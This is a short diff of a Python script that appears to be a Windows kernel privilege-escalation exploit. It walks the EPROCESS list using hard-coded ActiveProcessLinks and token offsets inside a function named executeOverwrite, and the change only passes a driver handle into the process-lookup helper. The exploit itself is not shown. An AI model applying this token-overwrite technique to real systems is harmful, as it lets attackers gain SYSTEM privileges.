@@ -276,7 +276,7 @@ active_process_links_offset = 0x2e8
 token_offset = 0x358
 
 
-def get_current_eprocess(system_process_base_pointer):
+def get_current_eprocess(system_process_base_pointer, driver):
     """ Returns ptr to Current EPROCESS structure """
 
     flink = c_ulonglong()
@@ -359,7 +359,7 @@ def executeOverwrite():
         # Walk the process list for wherever our process is in memory.
 
         currentprocessBase = \
-            get_current_eprocess(system_process_base_pointer)
+            get_current_eprocess(system_process_base_pointer, driver)
 
         # Define our expected offsets for this version of Windows.
 
